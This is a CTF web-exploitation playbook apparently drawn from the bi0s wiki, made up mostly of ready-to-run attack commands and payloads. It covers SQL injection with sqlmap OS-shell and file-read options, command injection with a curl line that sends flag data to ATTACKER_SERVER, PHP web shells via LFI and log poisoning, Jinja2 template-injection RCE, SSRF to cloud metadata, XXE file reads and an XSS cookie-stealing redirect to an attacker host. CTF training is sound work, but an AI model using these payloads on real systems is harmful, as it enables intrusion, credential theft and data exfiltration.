# Web Exploitation — bi0s Wiki Methodology

> Source: wiki.bi0s.in/web | CTF Web Playbook

## Phase 1: Recon

### 1.1 Initial Fingerprinting
```bash
# Full response headers
curl -sv TARGET_URL 2>&1 | head -50

# Technology fingerprinting
curl -s TARGET_URL | grep -iE 'powered-by|server|framework|version|wp-content|laravel|django|flask'

# Robots / Sitemap
curl -s TARGET_URL/robots.txt
curl -s TARGET_URL/sitemap.xml

# Common config files
curl -s TARGET_URL/.git/HEAD
curl -s TARGET_URL/.env
curl -s TARGET_URL/config.php
curl -s TARGET_URL/wp-config.php
curl -s TARGET_URL/admin/
curl -s TARGET_URL/phpmyadmin/
```

### 1.2 Directory & File Fuzzing
```bash
# ffuf (fast)
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u TARGET_URL/FUZZ \
     -mc 200,201,301,302,403 -t 50

# gobuster
gobuster dir -u TARGET_URL -w /usr/share/wordlists/dirb/common.txt \
             -x php,html,txt,js,json -t 50

# Parameter fuzzing
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "TARGET_URL?FUZZ=test" -mc 200 -fs BASELINE_SIZE
```

### 1.3 Source Code Review
```bash
# HTML comments
curl -s TARGET_URL | grep -oE '<!--.*-->'

# JS files
curl -s TARGET_URL | grep -oE 'src="[^"]+\.js"' | sed 's/src="//;s/"//'
# Then fetch each JS file and look for API keys, endpoints, flags

# Page source flag search
curl -s TARGET_URL | grep -iE 'flag|CTF|secret|token|api.key'
```

---

## Phase 2: SQL Injection

### 2.1 Manual Detection
```
' OR '1'='1
' OR 1=1--
" OR "1"="1
' OR SLEEP(5)--      # time-based blind
' UNION SELECT NULL--
```

### 2.2 Error-Based SQLi
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
```

### 2.3 UNION-Based SQLi
```sql
-- Find column count:
' ORDER BY 1--   ' ORDER BY 2--  ...until error
-- Get data:
' UNION SELECT NULL,NULL,database(),NULL--
' UNION SELECT NULL,NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,NULL,group_concat(username,':',password),NULL FROM users--
```

### 2.4 Automated: sqlmap
```bash
# Form POST
sqlmap -u TARGET_URL --data "username=test&password=test" --dbs --batch

# GET parameter
sqlmap -u "TARGET_URL?id=1" --dbs --tables --dump --batch

# With cookie
sqlmap -u TARGET_URL --cookie "session=VALUE" --dbs --batch --level=3

# File read
sqlmap -u "TARGET_URL?id=1" --file-read=/etc/passwd --batch

# OS shell (if stacked queries / FILE privilege)
sqlmap -u "TARGET_URL?id=1" --os-shell --batch
```

---

## Phase 3: Command Injection

```bash
# Detection payloads:
; id
| id
&& id
`id`
$(id)
; sleep 5    # Blind: time-based

# File read:
; cat /etc/passwd
; cat /flag.txt
; cat /flag

# Blind: out-of-band (if internet accessible):
; curl http://ATTACKER_SERVER/?output=$(cat /flag | base64)
```

---

## Phase 4: LFI / Path Traversal

```bash
# Classic traversal
?file=../../../../etc/passwd
?page=....//....//....//etc/passwd   # filter bypass

# PHP wrappers
?file=php://filter/convert.base64-encode/resource=index.php
# Decode: echo BASE64 | base64 -d

?file=php://input  # POST body as PHP code
POST body: <?php system($_GET['cmd']); ?>

?file=data://text/plain,<?php system('id');?>
?file=expect://id   # requires PHP expect extension

# Log poisoning (if LFI + writable log)
# Inject PHP in User-Agent:
curl TARGET_URL -H 'User-Agent: <?php system($_GET[cmd]); ?>'
# Then: ?file=../../../../var/log/apache2/access.log&cmd=id
```

---

## Phase 5: SSTI (Server-Side Template Injection)

```
# Detection payloads:
{{7*7}}       → 49   (Jinja2/Twig)
${7*7}        → 49   (FreeMarker/Velocity)
<%= 7*7 %>    → 49   (EJS/ERB)
#{7*7}        → 49   (Ruby/Slim)

# Jinja2 RCE (Flask):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS_IDX](['id'],stdout=-1).communicate()}}

# Find subprocess index:
{{''.__class__.__mro__[1].__subclasses__()}}
# Look for: <class 'subprocess.Popen'> → note its index
```

---

## Phase 6: Authentication Bypass

### JWT (JSON Web Tokens)
```bash
# Decode
echo "PAYLOAD_PART" | base64 -d

# Attack: alg:none
# Craft token with {"alg":"none"} header, modify payload, empty signature

# Attack: weak secret
hashcat -m 16500 "FULL.JWT.TOKEN" /usr/share/wordlists/rockyou.txt

# flask-unsign
flask-unsign --decode --cookie 'SESSION_COOKIE'
flask-unsign --sign --cookie "{'logged_in': True, 'role': 'admin'}" --secret 'SECRET'
flask-unsign --crack --cookie 'SESSION_COOKIE' --wordlist /usr/share/wordlists/rockyou.txt
```

### SSRF (Server-Side Request Forgery)
```bash
# Test internal services
?url=http://localhost/admin
?url=http://127.0.0.1:22
?url=http://169.254.169.254/latest/meta-data/   # AWS
?url=http://192.168.0.1/admin

# Bypass filters
?url=http://0x7f000001/          # hex IP: 127.0.0.1
?url=http://2130706433/          # decimal IP: 127.0.0.1
?url=http://localtest.me/        # DNS resolves to 127.0.0.1
?url=http://[::1]/               # IPv6 loopback
```

---

## Phase 7: XXE (XML External Entities)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<foo>&xxe;</foo>
```

---

## Phase 8: XSS

```html
<!-- Basic reflected -->
<script>alert(document.cookie)</script>
"><svg/onload=alert(1)>
javascript:alert(1)

<!-- Cookie steal (needs web server) -->
<script>document.location='http://ATTACKER/?c='+document.cookie</script>

<!-- CSP bypass check: look for 'unsafe-inline' or missing CSP -->
curl -sI TARGET_URL | grep -i content-security
```

---

## Quick Reference

```bash
# Intercept / replay: Burp Suite
# Fuzz params: ffuf / wfuzz
# SQLi: sqlmap
# Directory: gobuster / ffuf
# JWT: flask-unsign, jwt.io
# Hash: hashcat, john
# CyberChef: https://cyberchef.org
```
